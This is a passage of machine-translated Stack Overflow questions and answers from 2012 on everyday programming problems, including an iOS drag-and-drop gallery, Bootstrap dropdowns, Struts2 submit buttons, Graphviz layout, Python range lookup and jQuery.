} else if (attachment.type == 3){
    UIImageView *imageView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 64, 64)];
    imageView.image=[UIImage imageNamed:@"recyclebin.png"];
    [btnAttachment addSubview:imageView];
    [imageView release];
}

[_scrollView addSubview:btnAttachment];
[btnAttachment release];

}

- (void) removeAttachment:(GalleryButton *)button
{

}

#pragma mark - RELOAD DATA

- (void) reloadData
{

}

#pragma mark - GALLERY BUTTON DELEGATE

-(void) touchDown
{
[self.delegate didPressButton];
}

-(void) touchUp
{
[self.delegate didDropButton];
_scrollView.scrollEnabled = YES;
}

-(BOOL) isInsideRecycleBin:(GalleryButton *)button touching:(BOOL)finished;
{
CGPoint newLoc = [self convertPoint:self.recycleBin.frame.origin toView:self.mainView];
CGRect binFrame = self.recycleBin.frame;
binFrame.origin = newLoc;

if (CGRectIntersectsRect(binFrame, button.frame) == TRUE){
    if (finished){
        [self removeAttachment:button];
    }
    return YES;
}
else {
    return NO;
}

}

@end 
```

**GalleryButton.h**

```
#import <UIKit/UIKit.h>

@protocol GalleryButtonDelegate;

@interface GalleryButton : UIView
{

id<GalleryButtonDelegate> delegate;

CGPoint _originalPosition;
CGPoint _originalOutsidePosition;

BOOL isInScrollview;

// PARENT VIEW WHERE THE VIEWS CAN BE DRAGGED
UIView *mainView;
// SCROLL VIEW WHERE YOU GONNA PUT THE THUMBNAILS
UIScrollView *scrollParent;
UIImageView *images;
}

@property (nonatomic, retain) id<GalleryButtonDelegate> delegate;
@property (nonatomic) CGPoint originalPosition;
@property (nonatomic, retain) UIView *mainView;
@property (nonatomic, retain) UIScrollView *scrollParent;
@property (nonatomic, retain) IBOutlet UIImageView *images;
@end

@protocol GalleryButtonDelegate
-(void) touchDown;
-(void) touchUp;
-(BOOL) isInsideRecycleBin:(GalleryButton *)button touching:(BOOL)finished;
@end 
```

**GalleryButton.m**

```
#import <QuartzCore/QuartzCore.h>
#import "GalleryButton.h"
#import "GalleryScrollView.h"
#import "AttachmentItem.h"

@implementation GalleryButton

@synthesize delegate;
@synthesize originalPosition = _originalPosition;
@synthesize mainView, scrollParent;
@synthesize images;

- (id)init
{
self = [super init];
if (self) {
    // Initialization code here.
}

return self;
}

- (id)initWithFrame:(CGRect)frame
{
self = [super initWithFrame:frame];
if (self){

    isInScrollview  = YES;

    self.backgroundColor = [UIColor blackColor];
    self.layer.borderWidth = 2;
    self.layer.borderColor = [UIColor blackColor].CGColor;
    self.layer.masksToBounds = YES;
    self.layer.cornerRadius = 5;
}
return self;
}

#pragma mark - DRAG AND DROP

-(void) touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event {

[self.delegate touchDown];
self.originalPosition = self.center;
self.scrollParent.scrollEnabled = NO;

if (isInScrollview == YES) {
    CGPoint newLoc = CGPointZero;
    newLoc = [[self superview] convertPoint:self.center toView:self.mainView];
    _originalOutsidePosition = newLoc;

    //      [self.superview touchesCancelled:touches withEvent:event];
    [self removeFromSuperview];

    self.center = newLoc;
    [self.mainView addSubview:self];
    [self.mainView bringSubviewToFront:self];
    isInScrollview = NO;
}
else {
    ;
}

}

 -(void) touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event {

[UIView beginAnimations:@"stalk" context:nil];
[UIView setAnimationDuration:.001];
[UIView setAnimationBeginsFromCurrentState:YES];

UITouch *touch = [touches anyObject];
self.center = [touch locationInView: self.superview];

[UIView commitAnimations];

if ([delegate isInsideRecycleBin:self touching:NO]){

}

}

-(void) touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event {

if ([delegate isInsideRecycleBin:self touching:YES]){

    CGRect myImageRect = CGRectMake(0, 0, 320, 300);
    images = [[UIImageView alloc] initWithFrame:myImageRect];
    [images setImage:[UIImage imageNamed:@"light-cherry.png"]];
    [self.mainView addSubview:images];
    [self.images viewWithTag:1];

    UIImageView * animation = [[UIImageView alloc] init];
    animation.frame = CGRectMake(self.center.x - 32, self.center.y - 32, 40, 40);

    animation.animationImages = [NSArray arrayWithObjects:
                                 [UIImage imageNamed: @"iconEliminateItem1.png"],
                                 [UIImage imageNamed: @"iconEliminateItem2.png"],
                                 [UIImage imageNamed: @"iconEliminateItem3.png"],
                                 [UIImage imageNamed: @"iconEliminateItem4.png"]
                                 ,nil];
    [animation setAnimationRepeatCount:1];
    [animation setAnimationDuration:0.35];
    [animation startAnimating];
    [self.mainView addSubview:animation];
    [animation bringSubviewToFront:self.mainView];
    [animation release];
    ;
    [UIView beginAnimations:@"goback" context:nil];
    [UIView setAnimationDuration:0.4f];
    [UIView setAnimationBeginsFromCurrentState:YES];
    self.center = _originalOutsidePosition;
    [UIView setAnimationDelegate:self];
    [UIView setAnimationDidStopSelector: @selector(animationDidStop:finished:context:)];
    //        loadingView.frame = CGRectMake(rect.origin.x, rect.origin.y - 80, rect.size.width, rect.size.height);
    [UIView commitAnimations];

} else{
    [UIView beginAnimations:@"goback" context:nil];
    [UIView setAnimationDuration:0.4f];
    [UIView setAnimationBeginsFromCurrentState:YES];
    self.center = _originalOutsidePosition;
    [UIView setAnimationDelegate:self];
    [UIView setAnimationDidStopSelector: @selector(animationDidStop:finished:context:)];
    //        loadingView.frame = CGRectMake(rect.origin.x, rect.origin.y - 80, rect.size.width, rect.size.height);
    [UIView commitAnimations];

}

[self.delegate touchUp];

}

-(void)animationDidStop:(NSString *)animationID finished:(NSNumber *)finished context:(void *)context {
if ([animationID isEqualToString:@"goback"] && finished) {
    [self removeFromSuperview];
    self.center = _originalPosition;
    [self.scrollParent addSubview:self];
    isInScrollview = YES;
}
}

@end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T13:38:05.957

问题是您尚未声明自定义`init`方法：

```
- (id)initWithFrame:(CGRect)frame imageName:(NSString *)imageName; 
```

在`GalleryButton.h`. 您还没有在`GalleryButton.m`. 也许您根本不想在代码中使用此方法？

无论哪种方式，您都引用了它，并且 Xcode 已正确警告您它不存在（如果您构建并运行代码，您将收到一个*Unrecognized 选择器发送到实例*异常）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T13:39:12.600

你需要放在`initWithFrame:image Name`它`GalleryButton`的头文件中。永远记住，如果您收到类似“可能无法响应...”的警告，那是因为它没有在类头文件中公开提及。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T19:17:16.270

好的。在尝试自杀后，我发现了自己的错误。

我用了：

```
- (id)initWithFrame:(CGRect)frame imageName:(NSString *)imageName; 
```

在 GalleryButton.h 和 GalleryScrollview.h 中，我只是将其从 GalleryScrollview.h 中取出

谢谢大家

# drop-down-menu - 引导下拉菜单不起作用

> ID：13343947
> 
> 赞同：2
> 
> 时间：2012-11-12T12:45:03.690
> 
> 标签：drop-down-menu, twitter-bootstrap

我一直在搞乱我的网站一段时间，似乎无法让我的导航下拉菜单真正下拉。我已经阅读了一些关于此的问题，但找不到如此具体的内容。

我已经安装了我的 .js 文件，并且所有内容都已链接（据我所知）

```
<script src="/js/bootstrap.js" type="text/javascript"></script>
<script src="/js/bootstrap.min.js" type="text/javascript"></script>

<body>

<div class="navbar navbar-inverse navbar-fixed-top">
  <div class="navbar-inner">
    <div class="container">
      <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </a>
      <a class="brand" href="bootstrapindex.html">Student Food</a>
      <div class="nav-collapse collapse">
        <ul class="nav">
          <li class="active"><a href="bootstrapindex.html">Home</a></li>
          **<li><a href="about.html">About</a></li>
            <li class="dropdown">
                <a href="#" class="dropdown-toggle" data-toggle="dropdown">Recipes<b class="caret"></b></a>
            <ul class="dropdown-menu">
              <li><a href="#">Featured</a></li>
              <li><a href="about.html">Latest</a></li>
              <li><a href="about.html">Something else here</a></li>**
            </ul>
          </li>
            </ul> 
```

似乎无法理解为什么这不起作用。如果有人可以提供帮助，那就太棒了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T20:19:43.557

您将两次包含 Bootstrap JavaScript。
删除以下行之一：

```
<script src="/js/bootstrap.js" type="text/javascript"></script>
<script src="/js/bootstrap.min.js" type="text/javascript"></script> 
```

`bootstrap.min.js`只是`bootstrap.js`;的缩小版 这是相同的代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T13:00:23.787

尝试删除包装 div `<div class="nav-collapse collapse">`。我认为，下拉菜单可能会被溢出隐藏（当我复制粘贴你的代码片段时它被隐藏了）**。**

# java - GWT RequestFactory 客户端场景

> ID：13343948
> 
> 赞同：0
> 
> 时间：2012-11-12T12:45:05.020
> 
> 标签：java, gwt, requestfactory

我的*理解*是，GWT RequestFactory ( **RF** ) API 用于构建面向数据的服务，从而客户端实体可以直接与其服务器端 DAO 进行通信。

我的*理解*是，当您从客户端触发 RF 方法时，`RequestFactoryServlet`首先接收请求的是服务器上的生活。此 servlet 的作用类似于 a`DispatchServlet`并将请求路由到正确的服务，该服务与数据存储中的单个实体（模型）相关联。

我习惯于编写可能将请求传递给某些业务逻辑（如 EJB）的 servlet，然后计算一些响应以发回。这可能是一个 JSP 视图、一些复杂的 JSON (Jackson) 对象或其他任何东西。

在所有 RF 示例中，我没有看到这些 servlet 存在，我想知道它们是否存在于 GWT-RF 领域。如果`RequestFactoryServlet`自动将请求路由到正确的 DAO 和方法，并且 DAO 方法是响应中返回的内容，那么我可以看到 GWT RF 甚至不使用传统 servlet 的场景。**(1) 是这样吗？**

无论如何，在我的 GWT 应用程序中，有时我想点击特定的 url，例如`http://www.example.com?foo=bar`. **(2) 我可以为此使用射频吗？如果可以，如何使用？**

我想如果我能看到两个具体的例子，并排运行 GWT RF，我就能把所有的点联系起来：

*   场景 #1：我有一个`Person`实体，其方法包括`isHappy()`,`isSad()`等，需要与服务器端 DAO 交互；和
*   场景 #2：我想触发一个 HTTP 请求`http://www.example.com?foo=bar`并手动检查 HTTP 响应

如果可以使用 RF API 完成这两者，那将是我的首选。如果后一种情况不能用 RF 完成，那么请解释为什么以及 GWT 首选的替代方案是什么。提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T15:02:09.203

1.-请求工厂不仅适用于实体，也适用于服务，因此您可以使用从客户端调用的方法在服务器端定义任何服务。当然，当您使用 RF 服务时，它们能够处理某些类型（原始、盒装原始、集合、列表和 RF 代理）

```
@Service(value=RfService.class, locator=RfServiceLocator.class)
public interface TwService extends RequestContext {
  Request<String> parse(String value);
}

public class RfService {
public String parse(String value) {
  return value.replace("a", "b");
} 
```

2.- RF 不被认为接收除 RF servlet 产生的其他消息有效负载，并且您可以在客户端使用 RF 做的最多的事情是请求托管在不同站点的服务（当您将服务器和客户端部署在不同的站点时）主机）。

您可以使用 gwt world 中的其他机制从其他 url 获取数据，看看 gwtquery [Ajax](http://code.google.com/p/gwtquery/wiki/Ajax) and [data-binding](http://code.google.com/p/gwtquery/wiki/DataBinding)或这篇[文章](https://developers.google.com/web-toolkit/doc/latest/tutorial/Xsite)

# python - Python dict：如何将键映射到值，其中键是范围？

> ID：13343953
> 
> 赞同：0
> 
> 时间：2012-11-12T12:45:17.477
> 
> 标签：python, list, dictionary, map, range

我有一个值列表：

[0,1.51, 2.01, 2.51, 3.01,5.01, 6.01,7.01, 8.01,9.01, 10.01]

第二个值列表：

[.15, .22, .3, .37, .4, .5, .6, .7, .8, .9, 1]

我的程序的粗略逻辑是，如果某个变量的值介于第一个列表中的两个值之间，则将另一个变量的值设置为第二个列表中的相应项，即

```
if 0 < x < 1.51:
    y = 0.15
elif 1.51 < x < 2.01:
    y = .22
and so on 
```

很明显，我可以扩展 if/elif/else 流程以涵盖每种情况，但是（i）这并不漂亮，（ii）它不可持续（iii）我希望能够将其应用于任何两个列表，不需要知道其中包含的任何值。

在 Python 中实现这一目标的最佳方法是什么？

非常感谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-12T12:46:54.343

看看 bisect 模块 - [http://docs.python.org/2/library/bisect.html](http://docs.python.org/2/library/bisect.html)

还有百分比->成绩的例子：

```
>>> def grade(score, breakpoints=[60, 70, 80, 90], grades='FDCBA'):
        i = bisect(breakpoints, score)
        return grades[i]

>>> [grade(score) for score in [33, 99, 77, 70, 89, 90, 100]]
['F', 'A', 'C', 'C', 'B', 'A', 'A'] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T15:26:40.317

```
 m=[0,1.51, 2.01, 2.51, 3.01,5.01, 6.01,7.01, 8.01,9.01, 10.01]
    n=[.15, .22, .3, .37, .4, .5, .6, .7, .8, .9, 1]

    def test(x,a,b):
       for i in range(len(a)-1):
             if a[i] < x <a[i+1]:return b[i]

    >>>>test(3,m,n)
    >>>> 0.37
    >>>>test(.32,n,m)
    >>>> 2.01 
```

# java - 如何检测在单个 Action 类中的多个提交按钮场景中单击的提交按钮？

> ID：13343954
> 
> 赞同：6
> 
> 时间：2012-11-12T12:45:30.580
> 
> 标签：java, struts2, action, submit-button

我在jsp中有一个表格。有两个提交按钮：“搜索”和“添加新”按钮。

```
<s:form name="searchForm" action="employeeAction" method="post">
    <s:textfield name="id" label="Employee ID"/>
    <s:textfield name="name" label="Employee Name"/>

    <s:submit value="Search"/>
    <s:submit value="Add New"/>
</s:form> 
```

在`struts.xml`

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE struts PUBLIC
    "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"
    "http://struts.apache.org/dtds/struts-2.3.dtd">

<struts>

    <constant name="struts.enable.DynamicMethodInvocation" value="false" />
    <constant name="struts.devMode" value="true" />

    <package name="default" namespace="/" extends="struts-default">

        <default-action-ref name="index" />

        <global-results>
            <result name="error">/error.jsp</result>
        </global-results>

        <global-exception-mappings>
            <exception-mapping exception="java.lang.Exception" result="error"/>
        </global-exception-mappings>

    </package>

    <package name="example" namespace="/example" extends="default">

        <action name="employeeAction" class="example.EmployeeAction">
           <result name="search">/example/search.jsp</result>
           <result name="add" type="redirect">/example/add.jsp</result>
        </action>

    </package>
</struts> 
```

在Struts Action类中，我们知道处理http请求的方法只有一种，那就是`execute()`method。

在我预期的情况下，当我单击**搜索**按钮时，它将执行搜索数据并将数据呈现到`/example/search.jsp`，当我单击**添加新**按钮时，它将执行重定向页面到`/example/add.jsp`。但是，单击时两个按钮都将进入 execute() 方法。所以我需要知道如何检测`execute()`方法中点击了哪个按钮。

场景看起来像这样

```
public class EmployeeAction extends ActionSupport {

    public String execute() throws Exception {

        //PSEUDOCODE
        //IF (submitButton is searchButton) 
        //    return doSearch();
        //ELSE IF (submitButton is addNewButton) 
        //    return doAddNew();

        return SUCCESS;
    }

    public String doSearch() throws Exception {
        //perform search logic here
        return "search";
    }

    public String doAddNew() throws Exception {
        return "add";
    }
} 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-12T12:47:31.467

`struts.xml`您可以在文件中定义两个动作并使用标签的`action`属性`<s:submit>`来提交不同的动作[http://struts.apache.org/docs/submit.html](http://struts.apache.org/docs/submit.html)。

在 JSP 中：

```
<s:submit value="Search" action="searchEmployeeAction"/>
<s:submit value="Add New" action="addEmployeeAction"/> 
```

在 struts.xml 中：

```
<action name="addEmployeeAction" method="add" class="example.EmployeeAction">
    <result>/example/add.jsp</result>
</action>

<action name="searchEmployeeAction" method="search" class="example.EmployeeAction">
    <result>/example/search.jsp</result>
</action> 
```

并在您的操作中创建两个`public String`方法`add`和`search`.

阅读有关多个提交按钮的信息[http://struts.apache.org/docs/multiple-submit-buttons.html](http://struts.apache.org/docs/multiple-submit-buttons.html)。

**更新**

从 Struts2 版本 2.3.15.3 开始，您需要将`struts.mapper.action.prefix.enabled`常量设置为 true 以启用对`action:`前缀的支持。

把它放在你的`struts.xml`文件中：

```
<constant name="struts.mapper.action.prefix.enabled" value="true" /> 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-12T12:48:36.087

在您的模型层中，定义一个`String`名为“按钮”的属性。现在，对于您的两个提交按钮，指定`name`或`property`属性为“按钮”。因此，在您的`execute()`方法中，在属性“按钮”中，您将获得相应的值。

# size - 如何让 graphviz 生成固定大小的子图？

> ID：13343955
> 
> 赞同：13
> 
> 时间：2012-11-12T12:45:41.853
> 
> 标签：size, graphviz, dot, subgraph

我已经为此苦苦挣扎了一段时间，似乎找不到直接的答案。我正在使用 graphviz 中的复合子图，似乎找不到正确的设置组合来强制两个子图相互对齐。

附上一个简单的例子来说明问题......

```
digraph g {
  compound=true;

  subgraph cluster_top {
    graph [color=black, label="Top", rank=min];

    nodeA; nodeB; nodeC
    cluster_top_DUMMY [shape=point style=invis]
  }

  subgraph cluster_service {
    graph [color=black, label="Bottom", rank=min];
    node1; node2; node3; node4; node5; extra_long_node
    cluster_bottom_DUMMY [shape=point style=invis]
  }
  cluster_top_DUMMY -> cluster_bottom_DUMMY [ style=invis ]
} 
```

这会生成底部子图比顶部子图宽得多的输出。

![在此处输入图像描述](../Images/52bfbd3576cc11bc55d725514f177c75.png)

我真正想要的是确保顶部和底部的宽度始终完全相同。此外，如果有太多节点无法适应可用宽度，则会生成额外的节点行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-28T09:48:56.560

一个可能的（糟糕但有效的）解决方案是使用不可见的节点并设置宽度。考虑以下：

```
digraph g {
  compound=true;

    subgraph cluster_top {
      graph [color=black, label="Top", rank=min];

      nodeAI0 [style=invisible]
      nodeAI1 [style=invisible]
      nodeAI2 [style=invisible,fixedsize=true,width=1.65]
      nodeA; nodeB; nodeC
      cluster_top_DUMMY [shape=point style=invis]
    }

    subgraph cluster_service {
      graph [color=black, label="Bottom", rank=min];
      node1; node2; node3; node4; node5; extra_long_node
      cluster_bottom_DUMMY [shape=point style=invis]
    }
    cluster_top_DUMMY -> cluster_bottom_DUMMY [ style=invis ]
} 
```

![在此处输入图像描述](../Images/f137e535fdade1dbbbda1e2fc1fd50d5.png)

不可见节点（NodeAI0-NodeAI2）占据空间。fixedsize=true,width=1.65 使最后一个正好为 1.65 英寸。

另一个更好的解决方案是通过添加以下内容来专门设置相关的较长节点（以避免必须寻找正确的值）：

```
 node [fixedsize=true,width=0.75] 
```

在 Compound=true 部分之后。

# asp.net-mvc-3 - 执行子请求时出错

> ID：13343960
> 
> 赞同：3
> 
> 时间：2012-11-12T12:46:11.160
> 
> 标签：asp.net-mvc-3, exception, global-asax

在我的 MVC3 应用程序中，当我尝试处理超出最大请求的错误时，我收到了上述错误。

我在应用程序级别处理异常。我正在尝试重定向到位于视图共享文件夹中的错误页面。

如果请求大小超过限制，我将使用下面的代码重定向到错误页面。

```
 this.Server.ClearError();
 this.Server.Transfer("~/Views/Shared/NotAuthorised.cshtml"); 
```

这是我得到的错误。

> *执行 /SiteName/Views/Shared/NotAuthorised.cshtml 的子请求时出错*

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T13:19:30.487

根据 Microsoft 文档（[Error Executing Child Request" Error Message When You Use Server.Transfer or Server.Execute in ASP.NET Page](http://support.microsoft.com/kb/320439?wa=wsignin1.0)），您不能`Server.Transfer`在应用程序级错误后使用。

> Microsoft Internet 信息服务 (IIS) 根据请求文件的扩展名将 Server.Transfer 或 Server.Execute 请求分派到相应的 Internet 服务器应用程序编程接口 (ISAPI) 扩展名。例如，对 .aspx 页面的请求被调度到 Aspnet_isapi.dll ISAPI 扩展。
> 
> 在请求被分派到适当的 ISAPI 扩展之后，ISAPI 扩展不能调用另一个 ISAPI 扩展。您收到“症状”部分中列出的错误消息，因为处理对 ASP.NET 页的请求的 Aspnet_isapi.dll 文件无法将请求转发到处理对​​ ASP 页的请求的 Asp.dll 文件。

但是，您可以`Response.Redirect(path)`像这样使用：

```
Response.Redirect("Home/About"); 
```

# javascript - JavaScript - 字符串到对象？

> ID：13343966
> 
> 赞同：1
> 
> 时间：2012-11-12T12:46:46.883
> 
> 标签：javascript, json

我正在尝试将类别从字符串动态添加到 JavaScript 对象。但问题是这个字符串中的逗号不能被识别为单独的项目。

所以我有这个：

```
var prices = json_graph['offer_prices'].join(','); // that returns for example '2,3,4,5' 
```

然后我想像这样使用它：

```
xAxis: {
  categories: [prices]
} 
```

问题是，这被认为是一个单一的项目。如何用逗号拆分此字符串并将其添加到类别下？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:48:45.160

从您使用`join`它的事实来看，我会说该`offer_prices`属性是一个数组。所以没有必要把它变成一个字符串（但见下文，如果你有这样做的理由，你没有显示）：

```
xAxis: {
    categories: json_graph['offer_prices']
} 
```

或者，如果您出于某种原因想要复制它而不是使用原件：

```
xAxis: {
    categories: json_graph['offer_prices'].slice(0) // slice(0) = shallow copy
} 
```

如果您有创建字符串的理由`prices`并且确实想为此使用它，您可以通过使用逗号作为分隔符将其分开来做到这一点，其中`split`：

```
xAxis: {
    categories: prices.split(',')
} 
```

* * *

旁注：你已经写了，所以这*就是*`json_graph['offer_prices']`我在上面使用的，但是如果你在你的代码中使用它，你可以根据需要编写，除非你不需要这样做（你可能需要用一些工具或你正在使用的东西串起来，我不知道）。*`json_graph.offer_prices`*

 ** * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T12:51:26.090

```
categories = prices.split(","); 
```

这将使用分隔符将类别字符串拆分为多个字符串`,`并将它们返回到一个数组中。*

# payment-gateway - 如何为我公司的移动应用找到易于集成的支付网关提供商？

> ID：13343972
> 
> 赞同：-2
> 
> 时间：2012-11-12T12:47:03.097
> 
> 标签：payment-gateway, payment, mobile-application

我们是一家年轻的时尚零售初创公司，我们现在正在构建一个移动购物应用程序（多平台）。

我们正在寻找一种将支付集成到我们的移动应用程序中的方法，但我们正在努力选择和集成移动支付解决方案。这个问题似乎相当复杂——在做了一些研究之后，我们仍然有一些悬而未决的问题：

1.  选择支付服务时最重要的因素是什么？
2.  您如何/将如何寻找和选择支付集成解决方案？
3.  您遇到了哪些困难/我们应该做好准备？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T01:51:30.173

一般来说，你想看看他们的历史。有多久了。他们有一个庞大的社区。他们提供哪些类型的产品（收款服务）？将他们的解决方案集成到您的网站有多容易？设置用于刷信用卡的 POS 系统有多容易？在确保您符合 PCI 标准方面，您能获得多少帮助？您使用的系统有多安全？

这些都是您通常可以通过一些在线尽职调查找到的所有内容。

这些天来，很难不推荐使用 PayPal。至少，我总是建议将其作为买家的付款方式，因为很多人喜欢用它来支付费用。使用 PayPal 作为选项，您的转化率将比没有它时高得多。

那么，既然您无论如何都在使用它，我通常建议您也通过它接受信用卡。您可以为此部分使用 PayPal Payments Pro，并在您的网站上为人们提供这两种服务。如果他们选择信用卡，他们会直接在您的网站上输入他们期望的信息，他们不会知道 PayPal 实际上仍在后端处理这些信息。不过，它会让你的事情变得美好而整洁。

综上所述，您可以提供的选择越多越好。您可能希望让人们选择使用 CC、PayPal、Google Checkout、Amazon、ACH 或您能想到的任何其他方式付款。一方面，这可能会让您的买家感到困惑。另一方面，您拥有的选择越多，由于您不接受他们想要使用的方法而有人不购买的可能性就越小。

不过，使用 PayPal 的另一个原因是他们可以免费开始使用。他们有大量的功能和不同的方式来集成他们的服务，所以随着你的成长，你可以将不同的东西绑定到你的系统中。

他们背后也有 eBay, Inc. 的力量，他们不断创新和开发新工具。他们还有一个庞大的 3rd 方开发人员社区，这些开发人员在他们的平台上构建，因此新工具一直在涌现。

我可以继续说下去，但是如果您想了解更多详细信息，请告诉我。

# iphone - 在 iPhone 中，是否保证始终调用 viewWillAppear、viewDidAppear、viewWillDisappear、viewDidDisappear？

> ID：13343975
> 
> 赞同：0
> 
> 时间：2012-11-12T12:47:08.630
> 
> 标签：iphone, ios

我正在使用 UIViewController 的 viewWillAppear、viewDidAppear、viewWillDisappear、viewDidDisappear。
我使用 UINavigationController 来导航视图控制器。

例如，我在 viewWillAppear 或 viewDidAppear 中创建 NSTimer 或注册通知。我使计时器无效或删除 viewWillDisappear 或 viewDidDisappear 中的通知。

但是如果这4个方法（viewWillAppear、viewDidAppear、viewWillDisappear、viewDidDisappear）没有被调用，程序就会崩溃或者发生retain cycle。

我找不到说明始终调用 viewWillAppear、viewDidAppear、viewWillDisappear、viewDidDisappear 的文档。

直到现在，它们似乎总是被调用，我的程序按预期工作。

但是有没有不调用这4个方法的情况呢？
或者是否有可能通常调用 4 种方法，但有时不会无缘无故地随机调用？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:54:17.583

我可以说 viewWillAppear 和 viewDidAppear 方法总是在你的视图中被调用。viewWillDisappear 和 viewDidDisappear 方法在您使用另一个视图更改或关闭它时调用。例如，如果您有一些滚动视图，则不会调用这些方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T12:57:53.817

是的，它们总是被调用。如果您子类化您的视图控制器之一，请确保调用超类实现。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-12T12:51:54.187

我认为您仍然可以相信这些方法，`viewDidLoad`而且`dealloc`对我来说从未失败过。

您可以在那里注册和删除通知。**但是**，我不知道你所有的应用规范，我推荐的可能不可行。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-12T12:56:50.293

是的，View 事件总是触发，但是要覆盖你必须声明它们的行为。

根据苹果文档 viewDidUnload 已被弃用。

查看此链接以获取 UIViewController 的官方苹果类参考

[UIViewController 参考](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIViewController_Class/Reference/Reference.html)

它指出：

UIViewController 类提供了在这些事件发生时调用的特定方法。子类可以覆盖这些方法来实现特定的行为。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-12T12:51:16.233

这是相同的线程，其中任何时候都问过我相同的问题，您可以在此处查看这些

[这里是第一个链接](https://stackoverflow.com/questions/7386333/guidelines-for-viewwillappear-viewdidappear-viewwilldisappear-viewdiddisappea)

[这里是第二个](https://stackoverflow.com/questions/5630649/what-is-the-difference-between-viewwillappear-and-viewdidappear)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-10-06T15:40:11.527

除了一些方法可能不会被调用和/或调用两次（例如，一次关闭/弹出多个控制器）的错误之外，在 iOS 7 中，如果您启动滑动到后手势，部分显示之前的控制器在导航堆栈，然后取消向后滑动，这样就不会发生弹出，您会观察到并非所有方法都在两个控制器上都被调用。

# c - 如何为postgresql创建一个返回两个或多个OUT参数的C语言函数？

> ID：13343981
> 
> 赞同：1
> 
> 时间：2012-11-12T12:47:26.913
> 
> 标签：c, postgresql, out-parameters

我需要在 postgresql 的 C 语言函数中返回两个整数数组。Afaik，在 postgresql 函数中返回两个整数数组的最佳方法是使用 OUT 参数声明该函数。但是如何在 postgresql 的 C 语言函数中返回两个输出参数？我应该返回一个包含数组大括号表示的两个字符串的元组吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T15:02:00.857

您必须返回两个数组的元组。实际上，Postgresql 的函数每次只返回一个参数。这是相对复杂的任务，但它是可能的。您可以找到一些示例 - google 关键字是 PG_RETURN_HEAPTUPLEHEADER

# objective-c - 蓝牙条码扫描器 iphone

> ID：13343983
> 
> 赞同：1
> 
> 时间：2012-11-12T12:47:39.207
> 
> 标签：objective-c, ios6, xcode4.5

嗨，你所有的朋友；

我正在尝试在 iPhone 中实现蓝牙条码扫描仪 App。我花了 5 到 6 个小时搜索它，但不幸的是我找不到任何关于它的特定文档或示例。请在答案中给我任何教程或示例的链接。

我是 iPhone 开发的新手，所以请在这个问题上帮助我。

请给我回答这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-07T22:34:08.063

你可以使用这个：

[https://code.google.com/p/zxing/](https://code.google.com/p/zxing/)

Zebra Crossing 是一个开源库，可以帮助您完成二维码的扫描和创建。但是，您必须更具体地了解蓝牙部分。

# jquery - jquery addclass到body标签

> ID：13343988
> 
> 赞同：6
> 
> 时间：2012-11-12T12:47:54.060
> 
> 标签：jquery, addclass

以下脚本在一个 div 中，这有关系吗？因为它不起作用。语法对吗？我需要告诉 jquery 先在 DOM 中升级吗？我该怎么做？

```
 $(document).ready(function() {
          $('body').addClass('diary');
        }); 
```

多谢你们。

这是 HTML 中的相关部分：

```
<body> 
```

```
 <header>
    <div class="logo">
      <a href=""></a>
    </div>  
    <nav class="main-nav">
      <a class="first" href="http://www.adrianwaddingham.com">HOME</a>
      <a class="second" href="/sheriff">SHERIFF</a>
      <a class="third" href="/biography">BIOGRAPHY</a>
      <a class="fourth" href="/contact">CONTACT</a>     
      <a class="fifth" href="/diary">DIARY</a>     

    </nav>

  </header>

<script>
        $(document).ready(function() {
          $('body').addClass('diary');
        });    
</script>

<section class="copy-main">
  <article> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:54:45.850

我了解到您正在查看 html 源代码以检查您添加的正文类。使用 javascript 进行的 DOM 操作在源代码中是不可见的，但您可以使用浏览器中的开发人员工具进行检查（Chrome、Firefox 和 IE 都有）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T12:48:51.633

您的代码完全正确，因为`$('body')`将搜索整个 DOM

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-12T12:51:14.487

脚本没问题。`Diary`类将适用于身体。你能分享你的日记课吗，请检查`jQuery`是否正确加载，使用任何开发工具，如 firebug。

在您的页面中添加 jQuery 文件，如下所示，其中 Scripts 是文件夹并且`jQuery.js`是 jQuery 文件。如果您已经将其包含在您的页面中，请使用任何开发人员工具检查它是否正确加载。

```
<script src="Scripts/jQuery.js" type="text/javascript"></script> 
```

或从 CDN 添加

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js" type="text/javascript"></script> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-12T12:53:28.097

